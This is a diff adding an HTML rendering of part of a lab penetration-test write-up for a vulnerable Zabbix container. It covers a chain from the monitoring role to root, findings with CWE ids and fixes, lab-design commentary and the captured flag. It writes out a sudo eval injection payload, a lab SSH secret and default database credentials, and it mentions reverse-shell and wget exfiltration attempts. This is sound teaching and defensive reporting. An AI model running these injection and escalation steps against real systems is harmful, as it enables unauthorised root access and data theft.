+<td>agent reads the mode-0600 secret the stored maintenance script points at, and the SSH password in it</td>
+<td><code>REQ /SECRET=Qz7mVr2KpT9x</code> → <code>uid=1001(operador)</code> over SSH</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>operador</code> → <code>supervisor</code></td>
+<td>the maintenance console binds <code>127.0.0.1:9001</code> and is unreachable; an SSH <code>direct-tcpid</code> forward reaches it, the token is in a group-readable file, and the token console <code>dup2</code>s the socket onto a shell's stdio</td>
+<td><code>token valido. shell de mantenimiento:</code> → <code>uid=1002(supervisor)</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>supervisor</code> → <code>root</code></td>
+<td>CWE-78 in a <code>NOPASSWD</code> sudo script: <code>zbx-svc-ctl.sh</code> <code>eval</code>s <code>$1</code></td>
+<td><code>sudo /usr/local/sbin/zbx-svc-ctl.sh &quot;zabbix_server; id; cat /root/flag.txt&quot;</code> → <code>uid=0(root)</code> + flag</td>
+</tr>
+</tbody>
+</table>
+<h3 id="why-this-order-and-not-another">Why this order, and not another</h3>
+<ul>
+<li><strong>The web frontend is not the first hop into the operating system.</strong> It is the first hop into the <em>monitoring role</em>, and the escalation to a Linux account happens through the agent's command execution. Reading the source told me this before I tried anything: <code>EnableRemoteCommands</code> is set, so the moment a Super Admin session exists, the interesting primitive is a Zabbix <em>action</em>, not a Zabbix <em>request</em>.</li>
+<li><strong>The <code>scripts</code> table is a map, not a payload.</strong> The lab deliberately kept the operator password <em>out</em> of the stored command, so reading the table tells you the path <code>/var/lib/zabbix/enc/.agent_healthcheck_secret</code> and nothing more. The password is only reachable by already being <code>zabbix</code>. That is why hop 2 must precede hop 3 — and it is the correct design: the disclosure that looks like the answer is actually a pointer to a file that needs a privilege you do not have yet.</li>
+<li><strong>Hop 4 needs no exploit.</strong> The console is bound to loopback and its token sits in a file <code>operador</code> can read by group. The only reason it is not trivially reachable is the bind address, and SSH port-forwarding is a standard feature, not a vulnerability. The interesting part is what the token console <em>is</em>: a service that accepts a bearer token and hands the caller a shell, having <code>dup2</code>'d the accepted socket onto stdin/stdout/stderr of an interactive <code>/bin/sh</code>. The shell's stdin <strong>is</strong> the network socket — the &quot;bash TCP socket via file descriptor&quot; the lab's own note gestures at. No <code>pty</code> is allocated, so <code>bash -i</code> prints <code>can't access tty; job control turned off</code> and still works.</li>
+</ul>
+<h3 id="control-test-on-the-final-step">Control test on the final step</h3>
+<p>The escalation is the <code>eval</code>, not sudo's generality:</p>
+<pre><code>supervisor@…:~$ sudo -n -l
+User supervisor may run the following commands on …:
+    (root) NOPASSWD: /usr/local/sbin/zbx-svc-ctl.sh
+</code></pre>
+<p>That is a <em>narrow</em> rule — one script, not <code>ALL</code>. It is still root, because the script itself is injectable:</p>
+<pre><code class="language-bash">#!/bin/bash
+# /usr/local/sbin/zbx-svc-ctl.sh
+SERVICE=&quot;$1&quot;
+...
+eval &quot;supervisorctl -c /etc/supervisord.conf restart $SERVICE&quot;
+</code></pre>
+<p><code>sudo</code> passes the argument through unmodified, so <code>sudo …/zbx-svc-ctl.sh &quot;zabbix_server; id; cat /root/flag.txt&quot;</code> reaches <code>eval</code> as one string. <strong>A <code>NOPASSWD</code> rule is only as narrow as the argument handling of the script it names</strong> — quoting the argument in the caller does not help, because the injection is in the callee.</p>
+<hr />
+<h2 id="6-independent-findings--not-used-by-the-chain-reported-anyway">6. Independent findings — not used by the chain, reported anyway</h2>
+<p>Reported because fixing only the chain steps leaves these live, and because two of them are the kind a reader would assume I had used.</p>
+<h3 id="61-the-scripts-ui-has-no-route-and-its-replacement-silently-no-ops--cwe-306-latent--broken-control">6.1 The Scripts UI has no route and its replacement silently no-ops — CWE-306 (latent) / broken control</h3>
+<p><code>CControllerScriptList</code> and <code>CControllerScriptEdit</code> exist in <code>app/controllers/</code>, but <strong>no file in the document root requires them</strong> — there is no <code>scripts.php</code>. The intended Super Admin surface does not exist. Its replacement, <code>scripts_exec.php</code>, builds a shadow trigger with a <strong>function id where Zabbix requires an item id</strong> (<code>'{'.$functionid.'}&gt;0'</code>), so the trigger can never reach PROBLEM, the escalation sits pending, and the helper's own 30-second cleanup cancels it:</p>
+<pre><code>392:20260927:221535.984 escalation cancelled: trigger id:900007 deleted.
+</code></pre>
+<p>The response says <code>Command sent for execution.</code> Fix: restore the route, and validate the trigger expression. <strong>The reporting lesson is the general one: a status message asserting success is not evidence of the action, in a control or in an exploit</strong> — see §4.</p>
+<h3 id="62-scripts-is-visible-to-every-super-admin-with-no-group-acl--cwe-862--cwe-200">6.2 <code>scripts</code> is visible to every Super Admin with no group ACL — CWE-862 / CWE-200</h3>
+<p>Even with the route restored, <code>Administration → Scripts</code> is gated by a fixed Super Admin check and filtered by neither <code>groupid</code> nor <code>usrgrp</code>, so any Super Admin session reads every stored command on every host. Here the lab mitigates it well (the password is not in the command), but the class is real: stored commands routinely embed credentials, <code>{HOST.CONN}</code> expansions, and internal addresses. Fix: scope script visibility by host group.</p>
+<h3 id="63-the-agents-server127001-allowlist--cwe-732-informational-a-control-that-worked">6.3 The agent's <code>Server=127.0.0.1</code> allowlist — CWE-732, informational, <strong>a control that worked</strong></h3>
+<p><code>zabbix_agentd.conf:90</code> restricts agent requests to loopback, and the agent says so on every rejection:</p>
+<pre><code>failed to accept an incoming connection: connection from &quot;[net-0-1]&quot; rejected, allowed hosts: &quot;127.0.0.1&quot;
+</code></pre>
+<p>This is what blocks the standard &quot;impersonate the Zabbix server, receive <code>system.run[]</code>&quot; attack, and it held against a correctly framed protocol message. <strong>I am reporting it because I attacked it and it stopped me, and because the agent is exposed on <code>0.0.0.0:10050</code> — a future <code>Server=</code> entry, a NAT rule, or a container-network change turns a working control into unauthenticated RCE on every monitored host.</strong> Keep <code>Server=</code>/<code>ServerActive=</code> loopback-only; if a remote server must poll, use PSK-encrypted communication (<code>TLSConnect</code>/<code>TLSAccept</code>), which is off by default here.</p>
+<h3 id="64-script-items-execute-on-the-zabbix-server-as-zabbix--cwe-78-a-second-rce-primitive-i-did-not-use">6.4 Script items execute on the Zabbix server as <code>zabbix</code> — CWE-78, a second RCE primitive I did not use</h3>
+<p>Independent of remote commands, a Zabbix <strong>Script item</strong> (type 10) runs <code>/usr/share/zabbix/externalscripts/&lt;key&gt;</code> on the <em>server</em>, as the server's account. I created one and the server executed it:</p>
+<pre><code>388:20260927:221808.843 item &quot;Zabbix server:pwn.exec[1]&quot; became not supported:
+      /usr/share/zabbix/externalscripts/pwn.exec: [2] No such file or directory
+</code></pre>
+<p>It failed only because the payload file did not exist — the primitive is real and needs no agent, no trigger, and no escalator. It is the <em>better</em> exfiltration channel in this lab and I did not use it, because the directory is absent and the server account cannot create it. Report it: any Super Admin session here has at least two independent command-execution paths, and closing <code>EnableRemoteCommands</code> alone leaves this one open.</p>
+<h3 id="65-mariadb-on-00003306-with-zabbixzabbix-and-all-privileges-on-the-schema--cwe-1392--cwe-250">6.5 MariaDB on <code>0.0.0.0:3306</code> with <code>zabbix</code>/<code>zabbix</code> and <code>ALL PRIVILEGES</code> on the schema — CWE-1392 / CWE-250</h3>
+<pre><code>3306/tcp open mysql MariaDB 10.3.23 or earlier (unauthorized)
+GRANT ALL PRIVILEGES ON zabbix.* TO 'zabbix'@'localhost';
+</code></pre>
+<p>Not used by the chain — the credential came from the agent-side secret in §5. Exposed on all interfaces with a stock account name and password as the password, this is a full database compromise for anyone who can reach the port: <code>users</code> (hashes), <code>sessions</code> (live tokens), <code>scripts</code>, <code>actions</code>. The <code>zabbix</code> account has no global <code>FILE</code> privilege, so <code>LOAD_FILE</code>/<code>INTO OUTFILE</code> are unavailable — I checked, and it is the one limit worth noting. Fix: bind to loopback, require a non-default credential, and grant per-table rather than schema-wide privileges.</p>
+<h3 id="66-guest-enabled-with-an-empty-password--cwe-258--cwe-287">6.6 <code>guest</code> enabled with an empty password — CWE-258 / CWE-287</h3>
+<pre><code>passwd: d41d8cd98f00b204e9800998ecf8427e      ( = md5(&quot;&quot;) )
+UPDATE usrgrp SET users_status=0 WHERE name='Guests';
+</code></pre>
+<p>The bootstrap explicitly re-enables it. This is the step that turns Finding 1 from &quot;authenticated SQL injection&quot; into &quot;one HTTP request away from anonymous&quot;, and it is a decision, not a defect. Fix: delete <code>guest</code>, or give it a random unusable password and no group membership. Note the password storage itself is <strong>unsalted MD5</strong> (<code>CUser.php:1055</code> — <code>md5($user['password'])</code>, compared at <code>CUser.php:1013</code>); I confirmed the scheme by cracking the seeded Admin hash offline against 750 601 candidate passwords across three wordlists with no match, so the password is strong even though the hashing is not.</p>
+<h3 id="67-passwordauthentication-yes--cwe-1392">6.7 <code>PasswordAuthentication yes</code> — CWE-1392</h3>
+<pre><code>PermitRootLogin no
+PasswordAuthentication yes
+UsePAM no
+PrintMotd no
+</code></pre>
+<p><code>PermitRootLogin no</code> is correctly set, and there is <strong>no pre-auth banner leak here</strong> — the opposite of the second lab in this series, where <code>Banner /etc/issue.net</code> handed over a live credential. <code>PrintMotd no</code> is also deliberate. Password auth is still enabled, and the operator password lives in a mode-0600 file read by the agent, so it is not image-baked — better hygiene than lab 3. Fix: keys only.</p>
+<h3 id="68-four-note-files-world-readable-three-of-them-a-roadmap--cwe-732--cwe-538">6.8 Four note files world-readable, three of them a roadmap — CWE-732 / CWE-538</h3>
+<p><code>[lab-home]/nota1.txt</code> is mode <code>0644</code> and world-readable; <code>[lab-home]/operador/nota3.txt</code> is <code>-r--r-----</code> and readable by any member of group <code>operador</code>; <code>[lab-home]/zabbix/.nota2.txt</code> and <code>[lab-home]/supervisor/nota4.txt</code> are correctly scoped to their owners. <code>nota1</code> states the tty is short-lived and that the NAT drops idle connections — accurate operational detail about the defence in depth, in a file any anonymous local user can read. <code>nota2</code> hands an unauthenticated reader working database credentials (<code>mysql -uzabbix -pzabbix</code>) and points at the <code>scripts</code> table. Fix: no operational detail in world-readable paths; inject hints at runtime in a lab, or drop them.</p>
+<h3 id="69-four-eol-components--cwe-1104-the-root-cause-of-findings-1-and-2">6.9 Four EOL components — CWE-1104, the root cause of Findings 1 and 2</h3>
+<p>Zabbix 3.0.3, PHP 5.6.36, Apache 2.4.33, Alpine 3.4.6. Zabbix 3.0.3 is two majors and a decade behind; PHP 5.6 has been unsupported since 2019. Per <code>decision-making.md</code> §4, CVE-2016-10134 is the <em>mechanism</em>; shipping an unmaintained monitoring stack to the internet is the <em>decision</em>. Fix: upgrade the whole tier, and report it as the decision so the next upgrade does not reintroduce the CVE on a supported-but-unpatched build.</p>
+<h3 id="610-a-stock-script-ships-sudo--cwe-250-informational">6.10 A stock script ships <code>sudo</code> — CWE-250, informational</h3>
+<pre><code>3  Detect operating system   sudo /usr/bin/nmap -O {HOST.CONN} 2&gt;&amp;1
+</code></pre>
+<p>A stock Zabbix script definition invokes <code>sudo</code> with <code>nmap</code> as a <em>root</em> Nmap, which enables SYN scanning and version detection against any host a Super Admin can add. It did not factor into the chain. Fix: drop <code>sudo</code> (Nmap's privileged raw sockets are the only reason it is there) and use unprivileged scanning or a fixed capability set.</p>
+<hr />
+<h2 id="7-design-of-the-lab">7. Design of the lab</h2>
+<p><strong>The name is narrative, not evidence</strong> — the second time in four labs, and the pattern is now worth stating as a rule: <em>a lab name is a genre, not a finding.</em> &quot;PipePwned&quot; suggested Windows named pipes; it was an Ubuntu Flask CI/CD app. &quot;Zabbixploit&quot; suggests a Zabbix web CVE — and there genuinely is one, CVE-2016-10134, so the name is accurate about the entry. It is misleading about everything after it: the escalation is not a Zabbix feature, it is <code>bash</code> <code>eval</code> in a sudo script, and the last two hops are a file mode and a loopback bind.</p>
+<p><strong>This lab self-documents, and that makes it the fourth confirmation.</strong> The entrypoint names <code>EnableRemoteCommands=1</code> as the intentional misconfiguration and says it is &quot;disabled by default in real Zabbix&quot;; the bootstrap names CVE-2016-10134 and explains that it replaced the Admin password specifically to stop players short-cutting it via the stock <code>zabbix</code>/<code>zabbix</code>; <code>nota2</code>–<code>nota4</code> walk through the remaining hops, including the file-descriptor hint. Per <code>decision-making.md</code> §7 this is a real cost: the derivation that produced the most transferable insight here — <em>the SQLi's sixth column is unescaped because its docblock says <code>@param int</code>, and PHP does not enforce that</em> — cost me one grep of <code>CProfile::insertDB()</code>, and it was preceded by twenty minutes of reading the author's prose about the CVE. A lab that hands you the answer and a lab that makes you find it produce the same green checkmark. <strong>The design requirement stands: hide the annotation, keep the trigger.</strong></p>
+<p><strong>The most valuable thing in the lab is broken, and that is worth more than a working hint.</strong> <code>scripts_exec.php</code> is a genuinely sophisticated piece of engineering — per-dispatch action/operation/opcommand isolation to avoid a real escalator race the author reproduced live, <code>INSERT IGNORE</code> with id re-drawing for the high-frequency tables, a conservative 30-second cleanup criterion. And it cannot dispatch anything, because the trigger expression references a function id where Zabbix requires an item id. A working helper would have taught me one API shape. A broken one taught me to read what an escalation actually requires, which is why I could build the chain myself. If this is fixed, the lab improves and the lesson is lost — worth weighing before the next revision.</p>
+<p><strong>One design decision deserves credit and one deserves criticism.</strong> Credit: keeping the operator password <em>out</em> of the <code>scripts</code> table, and putting it in a mode-0600 file that only the agent's account can read, is a well-constructed forced pivot. The disclosure you find first names the file that contains the answer, and you need a privilege you do not have to read it. Criticism: the SQLi is reachable by a <code>guest</code> account with an empty password, so the lab's most interesting bug is one login away from anonymous; and the escalation to <code>zabbix</code> is only possible because <em>both</em> <code>EnableRemoteCommands=1</code> and an unauthenticated Super Admin API exist, so the lab's difficulty is set by a configuration choice the author made deliberately and could have made differently.</p>
+<hr />
+<h2 id="8-tested--not-tested--could-not-test">8. Tested / not tested / could not test</h2>
+<p><strong>Tested, with evidence</strong></p>
+<ul>
+<li>Full TCP surface, service versions, container OS (<code>nmap -sV -Pn -p-</code>, <code>/etc/os-release</code>)</li>
+<li>Agent port 10050 from outside and from loopback, with the target's own rejection log as the control</li>
+<li><code>guest</code> empty-password login; SQLi sink, control, and error-based extraction with <code>LENGTH</code>/<code>SUBSTRING</code> cross-check</li>
+<li>Session hijack, proved by predicting the CSRF token from the injected id; privilege confirmed by rendered navigation</li>
+<li>JSON-RPC API: unauthenticated baseline, sessionid auth, <code>script.create</code>, <code>item.create</code> (types 2 and 10), <code>trigger.create</code>, <code>action.create</code></li>
+<li>Remote-command execution, proved by the process table and by HTTP exfiltration carrying <code>id -u</code>/<code>id -g</code>/<code>whoami</code></li>
+<li>Local privilege table for <code>operador</code>; <code>console.conf</code> readability by group</li>
+<li>Loopback console over an SSH <code>direct-tcpid</code> forward; token auth; <code>dup2</code>'d shell as <code>supervisor</code>; <code>sudo -n -l</code></li>
+<li>Command injection in the <code>NOPASSWD</code> script; <code>uid=0(root)</code> and the flag in one command</li>
+<li>Writable-directory enumeration for the <code>zabbix</code> account with <code>test -w</code> (not from mode strings)</li>
+<li>Offline crack attempt on the seeded Admin MD5 against 750 601 candidates</li>
+</ul>
+<p><strong>Tested and rejected, with the reason</strong></p>
+<ul>
+<li><strong>Impersonating the Zabbix server to the agent on 10050</strong> — rejected by <code>Server=127.0.0.1</code>; the loopback control returned a protocol reply and the network attempt returned nothing. Reported as 6.3.</li>
+<li><strong>Script item (type 10) as the exfiltration channel</strong> — the server executed it (<code>pwn.exec: No such file or directory</code>) but <code>/usr/share/zabbix/externalscripts/</code> does not exist and the server account cannot create it. Primitive reported as 6.4.</li>
+<li><strong><code>conf.import.php</code> to create a script</strong> — no Script importer exists in 3.0.3.</li>
+<li><strong><code>LOAD_FILE</code> / <code>INTO OUTFILE</code> from the SQLi</strong> — the <code>zabbix</code> DB account holds no global <code>FILE</code> privilege, and <code>mysqli_query</code> is single-statement, so no stacked <code>INSERT</code> into <code>scripts</code> either.</li>
+<li><strong>Writing the exfil file into the document root</strong> — <code>drwxr-xr-x 1000:zabbix</code> is not group-writable (§0.3); confirmed by <code>test -w</code> as the target user.</li>
+<li><strong>A Bash <code>/dev/tcp</code> reverse shell</strong> — it <em>did</em> execute (PIDs 1638/1639 prove it) but never established a usable session; the <code>nc</code> listener on the host had been consumed by an unrelated HTTP prober. Superseded by the <code>wget</code> channel, which is why the shell approach is not the chain.</li>
+</ul>
+<p><strong>Not tested</strong></p>
+<ul>
+<li>Exploitation of Zabbix 3.0.3 beyond CVE-2016-10134; no CVE sweep was run.</li>
+<li>The JSON-RPC API's full method surface — only the methods the chain needed.</li>
+<li>Whether <code>scripts_exec.php</code> behaves differently under load (the author documents a race they reproduced; I hit the id-collision symptom once, <code>[Z3005] query failed: [1062] Duplicate entry '900048'</code>, but did not characterise it).</li>
+<li>Persistence. Nothing was written that survives a restart.</li>
+</ul>
+<p><strong>Could not test</strong></p>
+<ul>
+<li>Whether the escalation survives a real network boundary. <code>nota1</code> claims a NAT drops idle connections; from the container's own bridge this is untestable, and I had no external vantage point.</li>
+<li>The claim in <code>nota1</code> that a tty &quot;drops soon&quot;. I did not test it; I treated it as a hint, not a fact.</li>
+</ul>
+<p><strong>One out-of-band action, disclosed.</strong> Early on I read the agent secret with <code>docker exec … su zabbix -c 'cat …'</code>, which is container access and <strong>not</strong> a network step. I flagged it at the time and then re-derived the identical value over the network (<code>REQ /SECRET=Qz7mVr2KpT9x</code>) so that every value in §5 rests on the network chain. Flagging it because a report that quietly mixes in a shortcut is a report whose other claims cannot be trusted.</p>
+<hr />
+<h2 id="9-flag">9. Flag</h2>
+<pre><code>Gracias por Jugar - IHATEFW . .
+</code></pre>
+<p>Proven as root, in the same command as the <code>uid=0(root)</code> read, via the <code>eval</code> injection in the <code>NOPASSWD</code> script — not read out of the filesystem with container access.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
